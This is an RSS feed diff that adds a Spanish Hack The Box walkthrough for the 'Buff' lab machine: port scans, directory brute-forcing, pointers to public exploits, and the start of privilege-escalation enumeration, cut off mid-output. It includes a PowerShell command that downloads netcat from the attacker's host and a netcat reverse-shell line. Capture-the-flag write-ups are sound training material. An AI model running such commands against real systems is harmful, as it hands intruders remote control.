@@ -12,7 +12,7 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>es</language>
     <copyright>©{year}, All Rights Reserved</copyright>
-    <lastBuildDate>Thu, 01 Oct 2020 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Mon, 07 Dec 2020 00:00:00 +0000</lastBuildDate>
     <sy:updatePeriod>daily</sy:updatePeriod>
     <sy:updateFrequency>daily</sy:updateFrequency>
     
@@ -21,6 +21,365 @@
     
     
 
+      
+      <item>
+        <title>Hack The Box - Buff</title>
+        <link>https://sckull.github.io/posts/buff/</link>
+        <pubDate>Mon, 07 Dec 2020 00:00:00 +0000</pubDate>
+        
+        <atom:modified>Mon, 07 Dec 2020 00:00:00 +0000</atom:modified>
+        <guid>https://sckull.github.io/posts/buff/</guid>
+        <description>Buff es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
+        <content:encoded>&lt;p&gt;Buff es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;
+
+
+
+
+  
+
+
+
+  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
+    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/buff/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
+  &lt;/div&gt;
+
+&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Nombre&lt;/th&gt;
+&lt;th&gt;Buff&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;OS&lt;/td&gt;
+&lt;td&gt;Windows&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Puntos&lt;/td&gt;
+&lt;td&gt;20&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Dificultad&lt;/td&gt;
+&lt;td&gt;Facil&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;IP&lt;/td&gt;
+&lt;td&gt;10.10.10.198&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Maker&lt;/td&gt;
+&lt;td&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/94858&#34;&gt;egotisticalSW&lt;/a&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
+&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto 7680 y el puerto http (8080) abiertos.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Sat Sep 12 02:35:25 2020 as: nmap -Pn -p- --min-rate 1000 -o allports buff.htb&lt;/span&gt;
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; buff.htb &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;buff.htb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.21s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span class=&#34;m&#34;&gt;65533&lt;/span&gt; filtered ports
+PORT     STATE SERVICE
+7680/tcp open  pando-pub
+8080/tcp open  http-proxy
+
+&lt;span class=&#34;c1&#34;&gt;# Nmap done at Sat Sep 12 02:38:42 2020 -- 1 IP address (1 host up) scanned in 197.50 seconds&lt;/span&gt;
+
+&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Sat Sep 12 02:39:30 2020 as: nmap -Pn -sV -sC -p 7689,8080 -o serviceports buff.htb&lt;/span&gt;
+Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; buff.htb &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;buff.htb&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.068s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+
+PORT     STATE    SERVICE  VERSION
+7689/tcp filtered collaber
+8080/tcp open     http     Apache httpd 2.4.43 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Win64&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; OpenSSL/1.1.1g PHP/7.4.6&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-open-proxy: Potentially OPEN proxy.
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Methods supported:CONNECTION
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.43 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Win64&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; OpenSSL/1.1.1g PHP/7.4.6
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: mrb3n&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s Bro Hut
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;span class=&#34;c1&#34;&gt;# Nmap done at Sat Sep 12 02:39:58 2020 -- 1 IP address (1 host up) scanned in 27.62 seconds&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
+&lt;p&gt;Encontramos una pagina web en el puerto 80.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/htb/buff/Screenshot_20200912_005303.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;dirbuster&#34;&gt;DIRBUSTER&lt;/h2&gt;
+&lt;p&gt;Utilizamos dirbuster para busqueda de directorios y archivos.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; _&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;. _ _  _  _  _ _&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    v0.3.9
+&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;_&lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; _&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;/_&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;_&lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;_&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+
+Extensions:  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; HTTP method: GET &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Suffixes: php, html, txt &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Threads: &lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Wordlist size: &lt;span class=&#34;m&#34;&gt;4614&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Request count: &lt;span class=&#34;m&#34;&gt;4614&lt;/span&gt;
+
+Error Log: /home/kali/tools/dirsearch/logs/errors-20-09-12_02-45-06.log
+
+Target: http://buff.htb:8080/
+
+Output File: /home/kali/tools/dirsearch/reports/buff.htb/20-09-12_02-45-08
+
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;02:45:08&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Starting: 
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;02:45:10&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; -    5KB - /
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;02:45:13&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; -    1KB - /admin.pl
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;02:45:14&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; -    1KB - /admin.cgi
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;02:45:17&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; -    1KB - /AT-admin.cgi
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;02:45:18&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; -    1KB - /aux
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;02:45:20&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; -    1KB - /cachemgr.cgi
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;02:45:21&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;301&lt;/span&gt; -  334B  - /boot  -&amp;gt;  http://buff.htb:8080/boot/
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;02:45:23&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; -    1KB - /com1
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;02:45:23&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; -    1KB - /com2
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;02:45:23&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; -    1KB - /cgi-bin/
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;02:45:24&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; -    1KB - /com3
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;02:45:25&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; -    1KB - /con
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;02:45:33&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;301&lt;/span&gt; -  332B  - /ex  -&amp;gt;  http://buff.htb:8080/ex/
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;02:45:34&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;503&lt;/span&gt; -    1KB - /examples
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;02:45:41&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; -    5KB - /index.php
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;02:45:42&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;301&lt;/span&gt; -  337B  - /include  -&amp;gt;  http://buff.htb:8080/include/
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;02:45:43&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;301&lt;/span&gt; -  333B  - /img  -&amp;gt;  http://buff.htb:8080/img/
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;02:45:43&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; -   18KB - /LICENSE
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;02:45:43&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; -    1KB - /licenses
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;02:45:45&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; -   18KB - /license
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;02:45:45&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; -    1KB - /lpt1
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;02:45:45&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; -    1KB - /lpt2
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;02:45:55&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; -    1KB - /phpmyadmin
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;02:45:57&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;301&lt;/span&gt; -  337B  - /profile  -&amp;gt;  http://buff.htb:8080/profile/
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;02:45:57&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; -    1KB - /prn
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;02:45:58&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; -    1KB - /nul
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;02:46:03&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; -    1KB - /server-info
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;02:46:03&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; -    1KB - /server-status
+
+Task Completed
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;shaun---user&#34;&gt;SHAUN - USER&lt;/h2&gt;
+&lt;p&gt;Al revisar la pagina vemos la version de la aplicacion web la cual es &lt;code&gt;Gym Management Software 1.0&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/buff/Screenshot_20200912_005455.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Exploramos si existe una vulnerabilidad en esta aplicacion y encontramos que tiene una &lt;a href=&#34;https://www.exploit-db.com/exploits/48506&#34;&gt;&lt;strong&gt;vulnerabilidad de RCE&lt;/strong&gt;&lt;/a&gt; utilizando una imagen. Descargamos el exploit, ejecutamos y logramos obtener una shell y nuestra flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/buff/Screenshot_20200912_005742.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Ejecutamos una shell inversa con netcat, el cual descargamos en la maquina y ejecutamos esta hacia nuestra IP y puerto.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-command&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;amp; { iwr 10.10.10.40/nc.exe -OutFile C:\Users\shaun\Desktop\nc.exe }&amp;#34;&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shaun&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Desktop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-e&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;40&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;443&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Creamos un pequeño servidor http con python3 y pusimos a la escucha netcat, logrando obtener una shell con el usuario SHAUN.&lt;/p&gt;
+&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
+&lt;p&gt;Realizamos una pequeña enumeracion en la maquina y encontramos un ejecutable     en la carpeta de descargas del usuario shaun.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/buff/Screenshot_20200912_013206.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Al realizar una busqueda de este archivo encontramos un &lt;a href=&#34;https://www.exploit-db.com/exploits/44470&#34;&gt;&lt;strong&gt;exploit que afecta a un servicio&lt;/strong&gt;&lt;/a&gt;. Además de ello encontramos el puerto 8888 en el cual corre este servicio en la maquina, pero este esta de manera local.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;C:&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;ampp&lt;span class=&#34;se&#34;&gt;\h&lt;/span&gt;tdocs&lt;span class=&#34;se&#34;&gt;\g&lt;/span&gt;ym&lt;span class=&#34;se&#34;&gt;\u&lt;/span&gt;pload&amp;gt;tasklist &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; find /i &lt;span class=&#34;s2&#34;&gt;&amp;#34;CloudMe&amp;#34;&lt;/span&gt;
+tasklist &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; find /i &lt;span class=&#34;s2&#34;&gt;&amp;#34;CloudMe&amp;#34;&lt;/span&gt;
+CloudMe.exe                   &lt;span class=&#34;m&#34;&gt;7388&lt;/span&gt;                            &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;     18,628 K
+C:&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;ampp&lt;span class=&#34;se&#34;&gt;\h&lt;/span&gt;tdocs&lt;span class=&#34;se&#34;&gt;\g&lt;/span&gt;ym&lt;span class=&#34;se&#34;&gt;\u&lt;/span&gt;pload&amp;gt;netstat -ano &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; find /i &lt;span class=&#34;s2&#34;&gt;&amp;#34;LISTENING&amp;#34;&lt;/span&gt;
+netstat -ano &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; find /i &lt;span class=&#34;s2&#34;&gt;&amp;#34;LISTENING&amp;#34;&lt;/span&gt;
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       &lt;span class=&#34;m&#34;&gt;956&lt;/span&gt;
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;
+  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       &lt;span class=&#34;m&#34;&gt;5736&lt;/span&gt;
+  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       &lt;span class=&#34;m&#34;&gt;4256&lt;/span&gt;
+  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       &lt;span class=&#34;m&#34;&gt;3648&lt;/span&gt;
+  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       &lt;span class=&#34;m&#34;&gt;528&lt;/span&gt;
+  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       &lt;span class=&#34;m&#34;&gt;1108&lt;/span&gt;
+  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       &lt;span class=&#34;m&#34;&gt;1504&lt;/span&gt;
